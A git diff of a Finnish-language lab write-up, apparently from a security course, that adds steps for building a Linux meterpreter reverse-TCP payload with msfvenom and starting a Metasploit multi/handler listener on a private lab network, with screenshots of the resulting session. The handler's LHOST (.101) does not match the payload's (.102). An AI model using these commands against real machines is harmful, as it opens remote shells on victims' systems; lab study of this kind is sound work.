@@ -171,8 +171,8 @@ Aluksi piti varmistaa, että minulla on kaksi laitetta jotka saavat yhteyden toi
 
 ![image](https://github.com/user-attachments/assets/f062348f-dffe-4a3b-901b-4b8b3a160c90)
 
-Hyökkääjäkoneen ip: `192.168.56.102`
-Uhrikoneen ip: `192.168.56.103`
+- Hyökkääjäkoneen ip: `192.168.56.102`
+- Uhrikoneen ip: `192.168.56.103`
 
 Luodaan haittaohjelma kommennolla `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf > shell.elf`
 
@@ -187,11 +187,23 @@ Luodaan haittaohjelma kommennolla `msfvenom -p linux/x86/meterpreter/reverse_tcp
 
 ![image](https://github.com/user-attachments/assets/628d474a-3372-4c6c-a5ad-4142bd48f411)
 
+Käynnistetään metasploitable komennolla `msfconsole`
+
 ![image](https://github.com/user-attachments/assets/2b973648-1182-49ca-9a16-006f0da17169)
+
+- Käynnistetään kuuntelija: `use exploit/multi/handler`
+- Asetetaan payload: `set payload linux/x86/meterpreter/reverse_tcp`
+- Asetetaan LHOST ja LPORT: `set LHOST 192.168.56.101
+set LPORT 4444`
+- Käynnistetään kuuntelija: `exploit`
 
 ![image](https://github.com/user-attachments/assets/f1dc1c15-0195-4d31-a476-5f022627d912)
 
+Näkymä uhrikoneelta: 
 
+Näkymä hyökkääjäkoneelta kun uhri on ajanut haittaohjelman
+
+![image](https://github.com/user-attachments/assets/1b26a6ea-99e2-4759-af96-7e325002b6ac)
 
 ## Lähteet
 
